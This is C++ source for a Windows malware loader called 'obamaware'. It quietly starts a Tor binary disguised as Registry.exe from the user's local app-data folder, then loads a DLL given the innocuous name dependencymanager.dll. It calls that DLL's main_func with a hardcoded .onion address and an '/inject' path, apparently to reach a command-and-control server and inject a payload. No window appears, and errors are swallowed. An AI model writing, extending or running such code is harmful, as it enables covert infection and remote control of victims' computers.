#include <windows.h>
#include <tuple>
#include <utility>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning(disable: 4996)

//cl /std:c++17 /O2 /DNDEBUG obamaware.cpp /link /SUBSYSTEM:WINDOWS /OUT:"obamaware.exe"

DWORD WINAPI RunRegistry(LPVOID) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    
    char torPath[MAX_PATH];
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Obamaware-v2\\tor\\tor\\Registry.exe", torPath, MAX_PATH);
    
    BOOL torStarted = CreateProcessA(torPath, nullptr, nullptr, nullptr, FALSE, 
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    
    if (torStarted) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    return torStarted ? 0 : 1;
}

template<typename R, typename... Args>
R SafeCall(void* fn, Args&&... args) {
    using Fn = R(WINAPI*)(Args...);
    return ((Fn)fn)(std::forward<Args>(args)...);
}

template<typename R, typename... Args>
struct ThreadTask {
    void* fn;
    std::tuple<Args...> args;
    R result;
    ThreadTask(void* f, Args&&... a) : fn(f), args(std::forward<Args>(a)...) {}
};

template<typename R, typename... Args>
DWORD WINAPI ThreadProc(LPVOID param) {
    auto* task = static_cast<ThreadTask<R, Args...>*>(param);
    
    __try {
        task->result = std::apply([task](auto&&... unpackedArgs) {
            return SafeCall<R>(task->fn, std::forward<decltype(unpackedArgs)>(unpackedArgs)...);
        }, task->args);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        task->result = R{};
    }
    
    delete task;
    return 0;
}

template<typename R, typename... Args>
HANDLE StartSafeThread(void* fn, Args&&... args) {
    auto* task = new ThreadTask<R, Args...>(fn, std::forward<Args>(args)...);
    
    HANDLE hThread = CreateThread(nullptr, 0, ThreadProc<R, Args...>, task, 0, nullptr);
    if (!hThread) {
        delete task;
    }
    return hThread;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // 1. Start TOR
    HANDLE hTor = CreateThread(nullptr, 0, RunRegistry, nullptr, 0, nullptr);
    if (hTor) {
        WaitForSingleObject(hTor, 5000);
        CloseHandle(hTor);
    }
    
    Sleep(2000); // TOR SOCKS5 ready buffer
    
    // 2. Load dependencymanager.dll
    char dllPath[MAX_PATH];
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Obamaware-v2\\dependencymanager.dll", dllPath, MAX_PATH);
    
    HMODULE hDll = LoadLibraryA(dllPath);
    if (hDll) {
        FARPROC pFunc = GetProcAddress(hDll, "main_func");
        if (pFunc) {
            HANDLE hInject = StartSafeThread<int>(
                pFunc, 
                "we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion",
                "/inject", 
                "main_func"
            );
            
            if (hInject) {
                WaitForSingleObject(hInject, 10000);
                CloseHandle(hInject);
            }
        }
        FreeLibrary(hDll);
    }
    
    return 0;
}